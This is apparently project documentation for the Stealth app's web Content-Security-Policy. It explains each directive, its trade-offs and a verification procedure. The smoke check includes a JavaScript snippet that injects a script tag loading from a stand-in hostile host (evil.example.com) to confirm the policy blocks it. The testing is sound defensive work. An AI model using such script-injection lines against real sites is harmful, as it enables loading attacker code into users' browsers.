# Web Content Security Policy

Stealth's web bundle (`client/web/index.html`) declares a strict
`Content-Security-Policy` meta tag to limit what the browser is allowed
to load and execute. This document explains the directives, the
trade-offs, and how to verify the policy after a build.

## The policy

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline';
               img-src 'self' data:;
               connect-src 'self' wss: https:;
               object-src 'none';
               base-uri 'self';
               frame-ancestors 'none';">
```

## Directive walk-through

| Directive | Value | Why |
|-----------|-------|-----|
| `default-src` | `'self'` | Block-by-default fallback for any directive the browser does not see listed. |
| `script-src` | `'self'` | Only first-party JavaScript. Flutter web bootstrap is self-hosted at `flutter_bootstrap.js`; no CDN, no inline `<script>`, no `eval`. A `<script src="https://evil/…">` injected via XSS is refused. |
| `style-src` | `'self' 'unsafe-inline'` | `'unsafe-inline'` is currently required because `index.html` contains an inline `<style>` block for the splash loader. Removing this fallback is tracked as Task 7.3 of `.ai-factory/plans/hardening-di-secure-storage.md` (extract loader CSS to `client/web/loading.css`). |
| `img-src` | `'self' data:` | Flutter inlines small icon/raster assets as `data:` URIs. |
| `connect-src` | `'self' wss: https:` | PocketBase signaling traffic uses HTTPS + SSE; future TURN-over-WebSocket will use `wss:`. Tighten to a specific origin once the deployment URL is stable. |
| `object-src` | `'none'` | Block `<object>`/`<embed>`/`<applet>` — no plugin surface needed. |
| `base-uri` | `'self'` | Stop XSS from rewriting `<base href>` and re-routing relative URLs to a hostile origin. |
| `frame-ancestors` | `'none'` | Clickjacking guard: refuse to be embedded in an `<iframe>`. |

## What is **not** covered

- **WebRTC media** (UDP) is unaffected by CSP — `connect-src` only
  governs fetch/XHR/WebSocket. ICE/TURN/STUN endpoints are configured
  via `.env.defaults` (`TURN_URL`, `TURNS_URL`) and policed by the
  browser's separate WebRTC permission model.
- **Service workers / PWA install** rely on the manifest at
  `/manifest.json`; `default-src 'self'` already allows it.

## Smoke check

Verify the policy applies and does not break the app:

1. Build and serve the web bundle locally:

   ```bash
   cd client
   flutter run -d chrome
   ```

2. Open Chrome DevTools → Console. **There must be no
   `Refused to load …` or `Refused to execute inline …` violations.**
   A single benign `Mixed Content` warning is acceptable when running
   against an HTTP PocketBase in dev mode; in production both ends are
   HTTPS.

3. Confirm the CSP is actually emitted: DevTools → Network → pick the
   document request → Headers / Response tab. The
   `Content-Security-Policy` meta is also visible via
   `document.querySelector('meta[http-equiv=\"Content-Security-Policy\"]')`
   in the Console.

4. Sanity-check that injection is blocked:

   ```js
   const s = document.createElement('script');
   s.src = 'https://evil.example.com/x.js';
   document.head.appendChild(s);
   ```

   Console should print `Refused to load the script
   'https://evil.example.com/x.js'`.

## Maintenance

- New external script source? Decide whether it really has to be
  external; prefer vendoring into the bundle. If it must stay external,
  add the explicit origin to `script-src` (do **not** loosen to `*`).
- New external font? Add the origin to `font-src` (currently inherits
  `default-src 'self'`).
- New realtime endpoint? Add the origin to `connect-src`.
- After any directive change, rerun the smoke check above before
  merging.
